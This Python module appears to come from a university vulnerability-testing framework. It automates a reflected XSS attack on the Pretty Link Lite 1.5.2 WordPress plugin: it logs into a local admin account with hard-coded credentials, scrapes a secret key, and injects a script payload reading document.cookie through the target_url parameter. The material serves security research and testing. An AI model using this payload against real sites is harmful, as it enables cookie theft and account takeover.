
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import sys
import os
import time
import re

import selenium.common.exceptions
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "XFDB_75614_D",
                  'Description' : "Pretty Link Lite 1.5.2 for wordpress 3.2 XSS",
                  'References' :  [['http://xforce.iss.net/xforce/xfdb/75614']], 
                  'Target' :      "Wordpress 3.2",
                  'TargetLicense' : '',
                  'Plugin' : "Pretty Link 1.5.2",
                  'VulWikiPage' : "seamster.cs.umd.edu/vulwiki/index.php/75614",
                  'Type' : 'XSS',
                  'Privileged' : True
                  }
    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.verified = False
        return
            

    def exploit(self):
        driver = self.create_selenium_driver()
                
        driver.get("http://127.0.0.1/wordpress/wp-admin")
        driver.find_element_by_id("user_login").send_keys("wpadmin")
        driver.find_element_by_id("user_pass").send_keys("wpadminpw21")
        driver.find_element_by_id("wp-submit").click()
        driver.get("http://127.0.0.1/wordpress/wp-admin/admin.php?page=pretty-link/prli-tools.php")
        jscode = driver.get_element(by_link_text="Get PrettyLink").get_attribute("href")

        keystr = re.match('.*k=(.+)&.*', jscode).group(1)
        if keystr:
            self.logger.info("Found secret code " + keystr)
        else:
            self.logger.error("Exploit failed, could not find secret code")

        driver.get("http://127.0.0.1/wordpress/wp-content/plugins/pretty-link/prli-bookmarklet.php?k=%s&target_url=%%23\"><script>alert(document.cookie);</script><a name=\"" % (keystr,))
        
        try:
            driver.get_alert()
            self.verified = True
            self.logger.info("XSS popup confirmed")
        except selenium.common.exceptions.NoAlertPresentException:
            self.verified = False
            self.logger.error("XSS Failed")
        
        if self.visible:
            time.sleep(10)

        driver.cleanup()
        return
    
    def verify(self):
        return self.verified
